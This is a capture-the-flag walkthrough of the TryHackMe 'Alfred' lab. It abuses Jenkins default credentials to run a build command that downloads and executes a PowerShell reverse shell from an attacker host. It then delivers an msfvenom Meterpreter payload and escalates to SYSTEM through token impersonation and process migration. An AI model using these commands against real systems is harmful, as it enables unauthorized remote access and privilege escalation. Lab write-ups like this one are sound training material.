---
title: 'Alfred - TryHackMe Walkthrough'
date: 2020-07-02 00:00:00
featured_image: '/images/posts/jenkins-cyberark.jpg'
excerpt: Exploit Jenkins to gain an initial shell, then escalate the privileges by exploiting Windows authentication tokens.
---

![](/images/posts/alfred-jenkins.png)

### Goal
Exploit Jenkins to gain an initial shell, then escalate the privileges by exploiting Windows authentication tokens.

### Reconnaissance
The default page of the web server on port 80 is showing a image of Bruce Wyne and a donations email. But nothing else.

With the help on nmap, lets see what ports are open and services are running on the victim machine.

```bash
    $ nmap -p- -A 10.10.86.199

    PORT     STATE SERVICE            VERSION
    80/tcp   open  http               Microsoft IIS httpd 7.5
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: Site doesn't have a title (text/html).
    3389/tcp open  ssl/ms-wbt-server?
    |_ssl-date: 2020-07-02T21:47:32+00:00; 0s from scanner time.
    8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
    | http-robots.txt: 1 disallowed entry
    |_/
    |_http-server-header: Jetty(9.4.z-SNAPSHOT)
    |_http-title: Site doesn't have a title (text/html;charset=utf-8).
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

- On port 80, we can see Microsoft IIS 7.5 web server is running.  
- 8080 - Another HTTP server on Jetty 9.4 and a robots.txt is there which can help. By visiting on port 8080, there is a Jenkins service running.  
- 3389 - Looks RDP port is open.  
- Operating System: Windows  

### Logging into Jenkins
Thought to brute force using different payloads, but while trying to capture the HTTP request, the *admin:admin* credentials worked.

### Getting a reverse shell
After looking around the tool, for executing the command on the underlying machine, found it under project --> configure --> Build.
As this is a Windows operating system, framed a powershell utility which can get executed and opens a reverse shell.
For this,
- Download the powershell code which opens a reverse shell from [Git.](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)  
- Start a simple webserver using `python3 -m http.server` in the same directory. So the victim will be able to download the powershell code file.
- Frame the command that needs to get executed on the operating system. In this case, I will listen for remote shell on 8001 port.

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.18.4:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.18.4 -Port 8001
```

- Open netcat in another terminal and listen on 8001 port. `nc -lnvp 8001`
- Navigate to Jenkins and goto, project configuration and paste the powershell command that was framed above under build. So our command will become part of build process.
- Build the project using "Build now" and the victim is connected to http server and downloaded the reverse shell code and then a reverse shell in the netcat server.
- The reverse shell is opened with user alfred\bruce and have below privileges enabled:

```bash
    PS C:\Users\bruce\Desktop> whoami /priv

    PRIVILEGES INFORMATION
    ----------------------

    Privilege Name                  Description                               State   
    =============================== ========================================= ========
    SeDebugPrivilege                Debug programs                            Enabled
    SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
    SeImpersonatePrivilege          Impersonate a client after authentication Enabled
    SeCreateGlobalPrivilege         Create global objects                     Enabled

```
- The flag is under  `C:\Users\bruce\Desktop\user.txt` as *79007a09481--------1321abd9ae2a0*.


### Getting a Meterpreter shell
For much convenience and to work on privilege escalation, lets get a Meterpreter shell.
- Create a payload file which opens a reverse shell and save it in the same place where the webserver is running, so the victim will be able to download.

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.2.18.4 LPORT=8002 -f exe -o shell.exe
```

- Create a reverse shell listener using Metasploit with exploit/multi/handler and having a PAYLOAD windows/meterpreter/reverse_tcp LHOST 10.2.18.4 LPORT 8002.

```bash
msf5 exploit(multi/handler) > run  
[*] Started reverse TCP handler on 10.2.18.4:8002
```

- Get this shell.exe downloaded to victim machine by executing the powershell command on the reverse shell that was already opened and start the process.

```bash
PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.18.4:8000/shell.exe','shell.exe')"
PS C:\Users\bruce\Desktop> dir


Directory: C:\Users\bruce\Desktop

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          7/2/2020   5:01 PM      73802 shell.exe                         
-a---        10/25/2019   3:22 PM         32 user.txt                          


PS C:\Users\bruce\Desktop> Start-Process "shell.exe"
```

- The metasploit now will open a meterpreter shell:

```

    meterpreter > sysinfo
    Computer        : ALFRED
    OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows
    meterpreter >
```

- `load incognito` module in meterpreter.
- List all the tokens that are available for the user, using `list_tokens -g` and we can see the user has a delegation token of BUILTIN\Administrators.
- Lets impersonate as administrator using `impersonate_token "BUILTIN\Administrators"`.
- Verify, by using `getuid`  

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
- Though we have privileged user, due to impersonating we will not be able to access complete system due to windows security.  To test this, goto C:\Windows\system32\config directory and will see only files which have full permissions.

```
meterpreter > dir
Listing: C:\Windows\system32\config
===================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2009-07-13 23:20:14 -0400  Journal
40777/rwxrwxrwx  0     dir   2009-07-13 23:20:14 -0400  RegBack
40777/rwxrwxrwx  0     dir   2009-07-13 23:20:14 -0400  TxR
40777/rwxrwxrwx  0     dir   2009-07-13 23:20:14 -0400  systemprofile
```

- We need migrate our process (shell.exe) whose pid is 1440, to a more stable and equally privileged process by checking the processes that are running on the victim using ps.

```
1440  2848  shell.exe             x86   0        alfred\bruce                  C:\Users\bruce\Desktop\shell.exe
```

```
meterpreter > ps
(ommitted other entries..)
668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe

meterpreter > migrate 668
[*] Migrating from 1440 to 668...
[*] Migration completed successfully.
meterpreter > ls -lrt
Listing: C:\Windows\system32\config
===================================

```

- Now we can see all the files under config including our flag root.txt, which has the value *dff0f748678--------25a45b8046b4a*.
